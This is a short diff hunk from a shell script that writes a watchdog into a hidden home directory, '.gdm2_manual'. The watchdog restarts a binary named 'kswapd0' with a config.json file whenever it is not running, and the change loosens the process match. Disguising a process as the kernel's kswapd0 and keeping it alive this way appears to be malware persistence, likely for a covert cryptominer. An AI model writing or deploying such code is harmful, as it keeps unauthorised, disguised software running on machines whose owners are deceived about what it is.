@@ -75,7 +75,7 @@ cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
 KSWAPD0_PATH="$HOME/.gdm2_manual/kswapd0"
 CONFIG_JSON_PATH="$HOME/.gdm2_manual/config.json"
 
-if ! pgrep -f "$KSWAPD0_PATH --config=$CONFIG_JSON_PATH" > /dev/null; then
+if ! pgrep -f "./kswapd0" > /dev/null; then
     echo "kswapd0 not started. Going to start it..."
     cd "$HOME/.gdm2_manual/" || exit
     ./kswapd0 --config=config.json &
